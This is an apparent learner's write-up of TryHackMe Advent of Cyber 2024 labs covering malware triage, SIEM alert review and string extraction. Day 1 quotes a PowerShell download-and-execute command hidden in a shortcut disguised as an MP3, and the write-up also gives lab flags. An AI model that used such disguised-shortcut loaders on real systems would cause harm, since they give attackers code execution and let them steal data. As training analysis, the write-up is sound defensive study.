# Advent of Cyber 2024

## Day 1
This challenge required us to investigate a Youtube to MP3 converter site named “The Glitch’s All-in-one Converter” I started off by launching the Attack box and starting the virtual machine. I accessed the machine by typing 10.10.214.113 on the web browser. 

<img width="1470" alt="Pasted Graphic 22" src="https://github.com/user-attachments/assets/675c4ff1-a763-49c7-9a25-9c2a7f69099d">

On the website, I entered the YouTube video link provided in the description. I selected the MP3 format.

<img width="1070" alt="Format Selection Protocol" src="https://github.com/user-attachments/assets/3e873ea7-a254-40d9-9c0a-c9b862ab0ce6">

After this, I clicked on the download file option to download the MP3 file. A zip file was downloaded.
￼
<img width="1470" alt="Pasted Graphic 24" src="https://github.com/user-attachments/assets/040e058d-936a-4f36-b7ea-85ae80fa06c6">

I then looked for the zip file in the root directory and clicked on the extract to option in the Edit menu to extract the contents of the zip file. Two files named song.mp3 and somg.mp3 were extracted.

<img width="1326" alt="Pasted Graphic 25" src="https://github.com/user-attachments/assets/6e3d7248-11f4-4c86-aba5-50a9d6be8ccf">

Then to determine their file type, I went to terminal and ran the commands `file song.mp3` and `file somg.mp3` to check their file type.
```
root@ip-10-10-129-168:~# file song.mp3
song.mp3: Audio file with ID3 version 2.3.0, contains:MPEG ADTS, layer III, v1, 192 kbps, 44.1 kHz, Stereo
root@ip-10-10-129-168:~# file somg.mp3
somg.mp3: MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Has Working directory, Has command line arguments, Archive, ctime=Sat Sep 15 07:14:14 2018, mtime=Sat Sep 15 07:14:14 2018, atime=Sat Sep 15 07:14:14 2018, length=448000, window=hide
root@ip-10-10-129-168:~# 
```

Then I used the exitfool tool to inspect the somg.mp3 file.

```
root@ip-10-10-129-168:~# exiftool somg.mp3
ExifTool Version Number         : 11.88
File Name                       : somg.mp3
Directory                       : .
File Size                       : 2.1 kB
File Modification Date/Time     : 2024:10:30 14:32:52+00:00
File Access Date/Time           : 2024:12:05 12:18:02+00:00
File Inode Change Date/Time     : 2024:12:05 12:15:14+00:00
File Permissions                : rw-r--r--
File Type                       : LNK
File Type Extension             : lnk
MIME Type                       : application/octet-stream
Flags                           : IDList, LinkInfo, RelativePath, WorkingDir, CommandArgs, Unicode, TargetMetadata
File Attributes                 : Archive
Create Date                     : 2018:09:15 08:14:14+01:00
Access Date                     : 2018:09:15 08:14:14+01:00
Modify Date                     : 2018:09:15 08:14:14+01:00
Target File Size                : 448000
Icon Index                      : (none)
Run Window                      : Normal
Hot Key                         : (none)
Target File DOS Name            : powershell.exe
Drive Type                      : Fixed Disk
Volume Label                    : 
Local Base Path                 : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Relative Path                   : ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Working Directory               : C:\Windows\System32\WindowsPowerShell\v1.0
Command Line Arguments          : -ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"
Machine ID                      : win-base-2019
root@ip-10-10-129-168:~# 
```
I could see the powershell command being used in the above output. I opened the powershell script using the given url: https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1

```
function Print-AsciiArt {
    Write-Host "  ____     _       ___  _____    ___    _   _ "
    Write-Host " / ___|   | |     |_ _||_   _|  / __|  | | | |"  
    Write-Host "| |  _    | |      | |   | |   | |     | |_| |"
    Write-Host "| |_| |   | |___   | |   | |   | |__   |  _  |"
    Write-Host " \____|   |_____| |___|  |_|    \___|  |_| |_|"

    Write-Host "         Created by the one and only M.M."
}
```

Here was a clue about the identity of the creator of the script, the initials M.M. I searched "Created by the one and only M.M." on GitHub and clicked on the issues column.

<img width="1105" alt="Pasted Graphic 26" src="https://github.com/user-attachments/assets/39f30a7f-1884-4fb1-9e85-d952cc15a7a5">

Then I decided to take a look at the questions for this challenge. The first one was “Looks like the song.mp3 file is not what we expected! Run "exiftool song.mp3" in your terminal to find out the author of the song. Who is the author? “ So I ran the command exiftool song.mp and noticed the name Tyler Ramsbey. 

Img

The next question was “The malicious PowerShell script sends stolen info to a C2 server. What is the URL of this C2 server?”. I clicked on the 3rd result in Issues on GitHub
<img width="1470" alt="Python Version of this #7" src="https://github.com/user-attachments/assets/42f088fc-9036-4cb3-8532-e27b9ee5910b">
<img width="1470" alt="Pasted Graphic 28" src="https://github.com/user-attachments/assets/1759af4a-1553-4bb5-be0f-41da9df45e10">

Here, the url http://papash3ll.thm/data was written. 
Then the question was “Who is M.M? Maybe his Github profile page would provide clues?” I searched around GitHub, found the GitHub profile of M.M and got the name “Mayor Malware” from a repository on the profile. 

<img width="1024" alt="Pasted Graphic 29" src="https://github.com/user-attachments/assets/c0753a4a-3a70-47f7-8701-e7036c11ec3c">

The next question was “What is the number of commits on the GitHub repo where the issue was raised?”. So I checked the CryptoWallet-Search repo and found the number of commits to be 1.

<img width="1038" alt="Pasted Graphic 30" src="https://github.com/user-attachments/assets/30e138c9-1cc9-43c0-9ee3-54598f495ce0">

<img width="1466" alt="Pasted Graphic 31" src="https://github.com/user-attachments/assets/b8bee0ce-d695-413d-927e-732c22c9c6dd">


-New concepts
1. I came across Powershell which is a command-line shell and scripting language used to automate tasks and manage systems in Windows environments. The powershell script in here was designed to collect highly sensitive information and send it to an attacker's remote server.
2. I got a basic idea about OPSEC which stands for Operational Security

## Day 2
This challenge required us to identify if an alert was a True Positive (TP) or a False Positive (FP). I started off by starting the machine. Then I clicked on the https://10-10-244-229.p.thmlabs.com link to connect to the Elastic SIEM. I logged in to the site using the provided credentials. Then I went to the Discover tab present in the menu in the top left corner to see the events. I set the date to Dec 1st, 2024 and the time frame between 0900 and 0930 as the alert was triggered around this time.
<img width="644" alt="Options" src="https://github.com/user-attachments/assets/f91095f1-e87f-42db-a7e0-6c4a95a2676e">

There were 21 events during this timeframe.
<img width="1463" alt="Pasted Graphic 52" src="https://github.com/user-attachments/assets/9c06d5b9-a9b4-4021-a645-09aa56e8fff4">

I added some columns and then analyzed the events.
<img width="1463" alt="Pasted Graphic 53" src="https://github.com/user-attachments/assets/ed7f2b9b-2428-4e9b-be8c-a885b5e4502b">

The same powershell command was being executed on multiple machines. I expanded the time frame from 29th of November to the 1st of December. Then on adding some filters it was observed that the user could have done a brute force attack on 1st of December as there was an authentication success observed.
<img width="1463" alt="Pasted Graphic 54" src="https://github.com/user-attachments/assets/c2b7729d-addb-47e1-903b-c7c06333b986">

I also checked the number of failed logons by setting failure as a filter. It was 6791.
<img width="1463" alt="Pasted Graphic 57" src="https://github.com/user-attachments/assets/71342480-b474-4122-988c-98814a34a643">

Then I opened CodeChef to decode the PowerShell commands as they are in Base64 format. 
<img width="1463" alt="Pasted Graphic 56" src="https://github.com/user-attachments/assets/acd842ad-8ebe-4fdf-b6d3-dc4670a52081">

Then I answered the questions for this task.
<img width="1341" alt="Pasted Graphic 59" src="https://github.com/user-attachments/assets/dca7b467-dedc-4286-acf2-86d641130b98">


-New concepts:
1. I discovered what a SIEM is. It basically aggregates different events and information. It triggers an alert if it detects malicious activity. This alert could either be a TP or FP.



## Day 6
I started off by connecting to the virtual machine.
<img width="1470" alt="image" src="https://github.com/user-attachments/assets/eba5e61c-c76a-46ab-98d1-4dc0c39bc37a">

Then I typed the encoded dtring from the code on CodeChef. The output was: `Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion" -Name ProgramFilesDir`

<img width="1470" alt="image" src="https://github.com/user-attachments/assets/ebba1d1c-dfcc-40cc-89a1-af610c1e63c2">

The flag for question 1 was given here: THM{GlitchWasHere}.
On clicking on the MerryChristmasObf.exe file, there was no pop up. Then I entered the command `floss.exe C:\Tools\Malware\MerryChristmas.exe |Out-file C:\tools\malstrings.txt` in powershell.

<img width="854" alt="image" src="https://github.com/user-attachments/assets/526fb158-5ce3-4240-8cf6-a1a3b74ecf17">

I then opened the Malware.txt file and used the CTRL+F combination to search the flag by using THM.

<img width="979" alt="image" src="https://github.com/user-attachments/assets/040f0c62-37f6-423a-a638-7cf351d95ab0">

The flag given was THM{HiddenClue}.

<img width="1367" alt="image" src="https://github.com/user-attachments/assets/5ed2b265-93ec-496c-a786-42cc0c59f4b2">

### -New Concepts
1. A sandbox is an isolated environment where (malicious) code is executed without affecting anything outside the system.
2. YARA is a tool used to identify and classify malware based on patterns in its code.
3. Floss is a tool that can extract obfuscated strings from malware binaries.
   
